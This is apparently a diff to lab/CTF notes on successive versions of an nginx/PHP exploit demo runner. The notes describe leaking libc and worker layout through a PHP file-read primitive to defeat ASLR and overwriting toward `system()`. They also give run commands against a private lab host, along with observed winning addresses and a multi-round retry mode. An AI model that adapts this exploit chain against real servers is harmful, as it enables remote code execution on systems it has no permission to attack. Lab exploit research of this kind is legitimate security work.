@@ -1,6 +1,6 @@
 # Demo PoC Improvement Notes
 
-Last updated: 2026-05-15 05:06:15 CEST
+Last updated: 2026-05-15 05:17:45 CEST
 
 ## Scope
 
@@ -8,6 +8,9 @@ The original working exploit path is preserved. The improved demo runners are se
 
 - `demo_ctf_exploit_v1_1.py`
 - `demo_ctf_exploit_v1_2.py`
+- `demo_ctf_exploit_v1_3.py`
+- `demo_ctf_exploit_v1_4.py`
+- `demo_ctf_exploit_v1_5.py`
 
 Both runners are still lab/CTF tooling. They keep the same remote-only rule for exploit inputs: target facts are learned over the HTTP-exposed PHP local-file-read primitive and HTTP behavior, not from SSH, Docker exec, a target-side debugger, or hardcoded ASLR bases.
 
@@ -86,18 +89,116 @@ run artifact: artifacts/demo_v1_2_20260515-050555.json
 
 Status: pass. This is the stricter demo runner because the final candidate list is proven to come from the most recent controlled reset crash.
 
+## v1.3 Changes
+
+`demo_ctf_exploit_v1_3.py` adds stricter freshness and layout-drift checks:
+
+- Re-derives worker/libc facts before each calibration probe, avoiding stale expected PIDs after crashes.
+- Adds target snapshots to the JSON artifact.
+- Enforces strict core PID matching by default when a core PID note is present.
+- Captures a pre-reset target layout snapshot, then compares it with the post-reset final worker.
+- Fails on strict layout drift for nginx image base/path, libc base/path, and `system()` address.
+
+Validated command:
+
+```bash
+./demo_ctf_exploit_v1_3.py \
+  --host 192.168.1.205 --port 19321 \
+  --fast --no-color --require-reset-core \
+  --artifact-dir artifacts
+```
+
+Observed result:
+
+```text
+initial worker PID: 2602
+reset core PID: [2604]
+reset core nonce found: 928 URI-safe / 10437 slots
+pre-reset to final worker: system address stable
+winning address: 0x557f3875677a
+winning body offset: 0
+run artifact: artifacts/demo_v1_3_20260515-051328.json
+```
+
+Status: pass.
+
+## v1.4 Changes
+
+`demo_ctf_exploit_v1_4.py` adds stricter fail-fast checks before noisy exploit attempts:
+
+- Strict preflight is enabled by default for ASLR, core settings, expected nginx config strings, and single-worker lab topology.
+- `--no-strict-preflight` and `--allow-multiple-workers` are available for diagnostics.
+- Final candidates are sanity-filtered for duplicate addresses, aligned body offsets, command fit inside the 4000-byte body, and URI-safe low overwrite bytes.
+- The artifact records the final payload size and candidate filter counts.
+
+Validated command:
+
+```bash
+./demo_ctf_exploit_v1_4.py \
+  --host 192.168.1.205 --port 19321 \
+  --fast --no-color --require-reset-core \
+  --artifact-dir artifacts
+```
+
+Observed result:
+
+```text
+initial worker PID: 2680
+reset core PID: [2681]
+reset core nonce found: 896 URI-safe / 10437 slots
+candidate sanity kept: 45
+candidate sanity dropped: 0
+winning address: 0x55b9f862777a
+winning body offset: 0
+run artifact: artifacts/demo_v1_4_20260515-051517.json
+```
+
+Status: pass.
+
+## v1.5 Changes
+
+`demo_ctf_exploit_v1_5.py` adds bounded campaign mode:
+
+- `--rounds` repeats the calibration, reset-core scan, and final-candidate path with fresh nonce/core state if a round is exhausted.
+- `--round-backoff` rate-limits retries between rounds.
+- The artifact now records per-round calibration attempts, selected geometry, reset-core facts, layout checks, candidate filtering, and winner metadata.
+
+Validated command:
+
+```bash
+./demo_ctf_exploit_v1_5.py \
+  --host 192.168.1.205 --port 19321 \
+  --fast --no-color --require-reset-core \
+  --rounds 2 --artifact-dir artifacts
+```
+
+Observed result:
+
+```text
+exploit rounds: 2
+round 1 reset core PID: [2759]
+round 1 reset core nonce found: 928 URI-safe / 10437 slots
+candidate sanity kept: 166
+candidate sanity dropped: 0
+winning address: 0x557c5768677a
+winning body offset: 0
+run artifact: artifacts/demo_v1_5_20260515-051730.json
+```
+
+Status: pass. The first round won, so the second round was not needed.
+
 ## Recommended Demo Command
 
 For video recording:
 
 ```bash
-./demo_ctf_exploit_v1_2.py --host 192.168.1.205 --port 19321 --clear --require-reset-core
+./demo_ctf_exploit_v1_5.py --host 192.168.1.205 --port 19321 --clear --require-reset-core --rounds 2
 ```
 
 For a fast validation run:
 
 ```bash
-./demo_ctf_exploit_v1_2.py --host 192.168.1.205 --port 19321 --fast --require-reset-core
+./demo_ctf_exploit_v1_5.py --host 192.168.1.205 --port 19321 --fast --require-reset-core --rounds 2
 ```
 
 ## Remaining Technical Limits
